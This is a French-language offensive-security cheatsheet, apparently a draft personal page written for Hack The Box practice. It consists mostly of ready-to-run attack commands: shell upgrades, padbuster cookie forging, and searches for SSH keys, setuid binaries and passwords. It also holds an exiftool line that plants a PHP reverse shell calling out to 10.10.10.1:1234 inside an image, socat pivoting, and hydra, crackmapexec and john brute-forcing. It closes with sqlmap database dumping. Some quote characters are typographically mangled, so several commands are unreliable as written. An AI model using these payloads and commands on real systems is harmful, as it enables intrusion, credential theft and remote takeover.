---
title: "Cheatsheet"
date: 2021-09-29T08:47:11+01:00
draft: true
fontsize: 12pt
---

# Summary

- [Introduction]()
- [Reverse shell]()
- [Transfert de fichiers]()
- [Exploit & élévation de privilèges (Linux)]()
- [Exploit & élévation de privilèges (Windows)]()
- [Bruteforce]()
- [Injection SQL]()

---

## Reverse shell samples

* https://github.com/acole76/pentestmonkey-cheatsheets/blob/master/shells.md

---

## Exploit & élévation de privilèges (Linux)
```python
python -c 'import pty; pty.spawn("/bin/sh")'
```
```bash
/usr/bin/script -qc /bin/bash /dev/null
```
Pour obtenir un shell plus élevé, afin de passer d’un reverse shell à un shell complet
```bash
padbuster <URL> <COOKIE> <BLOCK_SIZE> -cookies "<PHPESSID_COOKIE> <OPTIONNAL_COOKIES>" --plaintext '<NEW_VALUE>'
```
Exemple :
```bash
padbuster http://docker.hackthebox.eu:59436/profile.php tu%2FOelHH0Nx8BaMhIurtihnbzj6YiABdvdMp0%2Fm6NII%2FClg%2B5Os9Rg%3D%3D 8 -cookies « PHPSESSID=74j9m7o8pbaq8pdoq3l56rvpk4; iknowmag1k=tu%2FOelHH0Nx8BaMhIurtihnbzj6YiABdvdMp0%2Fm6NII%2FClg%2B5Os9Rg%3D%3D » –plaintext ‘{« user »: »test », »role »: »admin »}’
```
```bash
searchsploit -t <INTITLE>  <KEYWORDS> -w
```
searchsploit windows local smb
```bash
sudo -l
```
-> liste les commandes autorisées pour l’utilisateur courant
```bash
find / -type d -writable 2> /dev/null
```
-> Liste les répertoires accessibles en écriture
```bash
find /* -user root -perm -4000 -print 2>/dev/null
```
-> Liste les binaires exécutables par l’utilisateur courant
```bash
find / -type f -perm /6000 -ls 2>/dev/null 
```
-> Liste les fichiers setuid/setgid sur le système
```bash
find / -iname "mon_fichier" -print 2>/dev/null
```
-> Trouver un fichier précis sur le système
```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```
-> Trouver des clés RSA ou des autorisations de connexion SSH

grep -rnw '/opt/bitnami/' --include=\*.php -e 'passw'

-> Rechercher du texte dans des fichiers d’une arborescence
```bash
binwalk socute.jpg 
```
-> Vérifier le contenu d’une image (peut contenir des fichiers zip par exemple)

 exiftool -Comment='<?php $sock = fsockopen("<IPADDRESS>",<PORT>);$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>'   <IMAGE>

exiftool -Comment='<?php $sock = fsockopen(« 10.10.10.1 »,1234);$proc = proc_open(« /bin/sh -i », array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>’ photo.png 

---

## Exploit & élévation de privilèges (Windows)


---

## Transfert de fichiers

* Permet de lancer un relai TCP vers une autre machine (pivoting)

``` bash
socat TCP4-LISTEN:1234 TCP4:10.10.10.171:80 &
```

* Pratique lorsqu’on se connecte à HTB via un VPS
```bash
socat TCP4-LISTEN:1234,fork TCP4:10.8.6.2:22 &
```
* Lance un relai TCP et fork le tunnel en cas de coupure
```bash
python -m SimpleHTTPServer <PORT>
```
* Lance un serveur web dans le répertoire local
```bash
apt-get install python-pyftpdlib

python -m pyftpdlib -p 21
```
* Lance un serveur ftp dans le répertoire courant
```bash
impacket/examples/smbserver.py -smb2support -username guest -password guest share /root/htb
```
* Lance un serveur smb accessible en tant que guest/guest

 Possibilité d’y accéder sous Windows avec un net use

---

## Bruteforce

Cracker un zip chiffré avec une liste de mots de passe
```bash
fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt secret.zip
```
```bash
crunch <MIN> <MAX> <CONTENT>
```

crunch 4 15 « abcdefghijklmnopqrstuvwxyz »
```bash
crackmapexec ssh 192.168.193.132 -u users.txt -p rockyou.txt
```
Tester une liste d’utilisateur avec une liste de mot de passe (SSH, SMB, WINRM)
```bash
hydra -l <USER> -P <WORDLIST> <IP ADDRESS> <METHOD> <URL>
```
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.157 http-get /monitoring
```
```bash
hydra -l <LOGIN> -P <WORDLIST> <URL> <METHOD>"<PAGE>:<ARGUMENT>=^<VALUE>^:<INCORRECT STRING>" -w <THREADS> -s <PORT>
```
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt docker.hackthebox.eu http-post-form « /index.php:password=^PASS^:Invalid password » -w 10 -s 45692
```
```bash
john --incremental <HASHFILE>
```
Pour bruteforcer de façon incrémentale
```bash
john <HASHFILE> --wordlist=/usr/share/wordlists/rockyou.txt
```
Pour bruteforcer avec un dictionnaire

Script de bruteforce anti-CSRF :

https://github.com/J3wker/anti-CSRF_Token-Bruteforce


---

## Injection SQL
```bash
sqlmap -u <URL> (--dbs / --tables -D <DATABASE> / --columns -D <DATABASE> -T <TABLENAME>)
```
```bash
sqlmap -u http://bidule.fr/index.php?id= –columns -D information_schema -T USER_PRIVILEGES
```
---

### [Back](/../../)